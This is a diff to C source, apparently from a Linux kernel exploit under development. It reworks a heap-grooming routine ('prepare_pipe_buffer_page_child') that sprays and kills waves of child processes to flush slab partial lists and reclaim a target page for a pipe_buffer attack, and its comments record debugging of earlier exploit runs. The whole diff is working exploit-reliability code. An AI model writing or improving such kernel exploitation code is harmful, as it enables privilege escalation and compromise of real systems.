@@ -448,7 +448,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     errno = tn_errno;
     pr_info("child conv fd=%d set=%d errno=%d\n", conv_fd, tr, errno);
   }
-  enum { CONVERT_MAX_WAVES = 24 };
+  enum { CONVERT_MAX_WAVES = 24, CONVERT_HOLD_WAVES = 6 };
   size_t wave_sz = 3 * objs_per_slab + 8;
   pid_t *wave_pids = calloc(CONVERT_MAX_WAVES * wave_sz, sizeof(pid_t));
   int waves_used = 0;
@@ -544,16 +544,30 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
             (unsigned long long)sc2, w % wave_ncpu);
     if (sc2 != 0) {
       /*
-       * The wave now owns the page (it flipped out of the buddy), or it was
-       * still the same stuck mm slab the wave could not rotate away.  Either
-       * way kill the wave: on success the page goes back to the buddy on top;
-       * the next loop iteration re-reads and decides whether we are done.
-       */
-      for (size_t i = 0; i < wave_n; i++) {
-        kill_child(wave_pids[w * wave_sz + i]);
-        wave_pids[w * wave_sz + i] = 0;
+       * Batch hold-kill instead of killing per wave.  A per-wave kill
+       * returns the just-allocated pages to the partial lists right away,
+       * so the next wave reallocates the same hot chain-head pages: the
+       * sweep cycles a handful of pages forever and never reaches a
+       * target sitting deep in the node partial list (forensics:
+       * pre-sweep inuse=0 frozen=1, 24 waves x 8 rotating cpus never
+       * moved sc; the 771b7409 success had its page near the partial
+       * head, so 2 waves reached it).  Hold every wave's clones until
+       * CONVERT_HOLD_WAVES accumulate, then kill the whole batch at
+       * once: the burst of empty slabs (6 x wave_sz objects ~= 19 pages)
+       * flushes past min_partial, and that discard wave frees pages all
+       * the way down the list -- including the target, which the next
+       * iteration then reads as sc==0 -> owned. */
+      if ((w + 1) % CONVERT_HOLD_WAVES == 0) {
+        for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++) {
+          for (size_t i = 0; i < wave_sz; i++) {
+            if (wave_pids[k * wave_sz + i]) {
+              kill_child(wave_pids[k * wave_sz + i]);
+              wave_pids[k * wave_sz + i] = 0;
+            }
+          }
+        }
+        taken_wave = w;
       }
-      taken_wave = w;
     }
     /* else: wave consumed a buddy page above the target; hold it out. */
     if (sc2 == tsc) {
@@ -565,6 +579,17 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
       }
     } else {
       sc_flat = 0;
+    }
+  }
+  /* Flush any held tail batch (when CONVERT_MAX_WAVES is not a multiple
+   * of CONVERT_HOLD_WAVES) so no wave child outlives the sweep; the
+   * owned re-check below then sees the post-flush page state. */
+  for (int k = 0; k < CONVERT_MAX_WAVES; k++) {
+    for (size_t i = 0; i < wave_sz; i++) {
+      if (wave_pids[k * wave_sz + i]) {
+        kill_child(wave_pids[k * wave_sz + i]);
+        wave_pids[k * wave_sz + i] = 0;
+      }
     }
   }
   pin_to_core(CORE);
